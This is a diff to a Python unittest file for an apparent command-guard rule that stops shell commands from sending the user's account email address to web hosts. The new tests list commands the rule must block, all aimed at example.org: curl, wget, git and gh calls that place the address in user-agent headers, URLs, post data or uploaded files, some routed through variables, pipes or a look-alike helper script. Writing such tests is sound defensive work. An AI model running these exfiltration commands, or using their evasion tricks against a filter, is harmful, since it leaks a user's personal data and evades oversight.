@@ -403,8 +403,28 @@ class RuleF(unittest.TestCase):
                   "curl -s https://example.org/api?x=1 -d 'a=b'",
                   "python3 -c \"import requests; requests.get('https://example.org/')\"",
                   "mail -s hi %s < /dev/null" % e,
-                  "curl -s https://example.org/ | grep -c %s" % e]:
+                  "git clone https://github.com/o/r.git && echo %s > who.txt" % e]:
             self.allowed(c)
+
+    def test_exemptions_do_not_cover_other_hosts_or_a_look_alike_script(self):
+        e = self.EM
+        for c in ["git -c http.userAgent='x %s' clone https://example.org/r.git" % e,
+                  "git clone https://example.org/%s.git" % e,
+                  "git -c http.extraHeader='User-Agent: %s' fetch" % e,
+                  "gh api --hostname example.org /user -f body=%s" % e,
+                  "python3 /tmp/gmail_api.py --user-agent 'x %s'" % e,
+                  "python3 - <<'EOF'\nimport requests  # gmail_api.py\nrequests.get('https://example.org/', params={'e': '%s'})\nEOF" % e,
+                  "python3 ~/.claude/scripts/gmail_api.py draft --to %s; python3 -c \"import requests; requests.get('https://example.org/', params={'e': '%s'})\"" % (e, e)]:
+            self.blocked(c)
+
+    def test_address_carried_between_segments_to_a_web_client(self):
+        e = self.EM
+        for c in ["E=%s; curl -A \"x ($E)\" https://example.org/" % e,
+                  "echo %s | curl -d @- https://example.org/" % e,
+                  "echo %s > /tmp/f.txt; curl -F f=@/tmp/f.txt https://example.org/" % e,
+                  "curl -s https://example.org/ | grep -c %s" % e,
+                  "X=%s\nwget --post-data=\"e=$X\" https://example.org/" % e]:
+            self.blocked(c)
 
     def test_other_address_is_not_the_account(self):
         self.allowed("curl -A 'bot someone.else@example.test' https://example.org/")
